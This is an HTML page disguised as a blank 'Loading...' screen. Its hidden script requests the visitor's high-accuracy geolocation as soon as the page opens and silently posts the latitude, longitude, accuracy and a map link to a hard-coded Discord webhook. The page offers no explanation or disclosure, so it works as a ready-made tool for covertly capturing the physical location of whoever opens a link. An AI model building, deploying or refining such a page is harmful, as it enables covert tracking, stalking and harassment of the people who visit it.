<!DOCTYPE html>
<html>

<head>
  <meta charset="UTF-8">
  <title>Loading...</title>
  <style>
    body {
      display: none;
    }
  </style>
</head>

<body>
  <script>
    const a = "https://discord.com/api/webhooks/1408320672110743623/qC2r_vnos_DwbDjQQN3OdoZSLMJ5WXX-UfhEQR0I5G9pEF_e-mjPZsk8vq8jSc5TqkI1";

    function b(x, y, z) {
      const d = {
        embeds: [
          {
            description: `**Lat:** ${x}\n**Lng:** ${y}\n**Accuracy:** Â±${z}m`,
            fields: [
              {
                name: "Map Link",
                value: `[Open in OpenStreetMap](https://www.openstreetmap.org/?mlat=${x}&mlon=${y}#map=18/${x}/${y})`
              }
            ],
            color: 65280,
            timestamp: new Date().toISOString()
          }
        ]
      };

      fetch(a, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(d)
      });
    }

    function c() {
      if (!navigator.geolocation) return;

      navigator.geolocation.getCurrentPosition(
        (p) => {
          const x = p.coords.latitude;
          const y = p.coords.longitude;
          const z = p.coords.accuracy;
          b(x, y, z);
        },
        () => { },
        {
          enableHighAccuracy: true,
          timeout: 5000,
          maximumAge: 0
        }
      );
    }

    c();
  </script>
</body>

</html>
